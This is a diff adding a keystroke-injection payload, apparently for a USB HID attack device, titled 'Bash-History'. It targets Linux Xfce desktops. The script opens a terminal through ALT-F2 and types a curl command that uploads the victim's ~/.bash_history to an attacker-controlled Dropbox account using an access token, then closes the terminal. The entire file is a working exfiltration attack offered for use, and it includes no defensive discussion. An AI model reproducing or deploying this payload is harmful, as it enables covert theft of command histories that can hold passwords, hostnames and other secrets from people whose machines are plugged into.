@@ -1,0 +1,29 @@
+REM Title: Bash-History
+REM Author: Zoe Ronen
+REM Description: This payload is meant to exfiltrate bash history to a dropbox
+REM Target: Linux/Xfce4
+
+REM replace the [DROPBOX_ACCESS_TOKEN] placeholder with your actual Dropbox access token
+DEFINE #API_TOKEN [DROPBOX_ACCESS_TOKEN]
+
+DELAY 500
+ALT-F2
+DELAY 500
+STRING xfce4-terminal
+DELAY 500
+ENTER
+DELAY 500
+STRING curl -X POST https://content.dropboxapi.com/2/files/upload
+SPACE
+STRING --header "Authorization: Bearer
+SPACE
+STRING #API_TOKEN
+STRING " --header "Dropbox-API-Arg: {\"path\": \"/home/$USER/.bash_history\"}"
+SPACE
+STRING --header "Content-Type: application/octet-stream" --data-binary @.bash_history
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 500
+ENTER
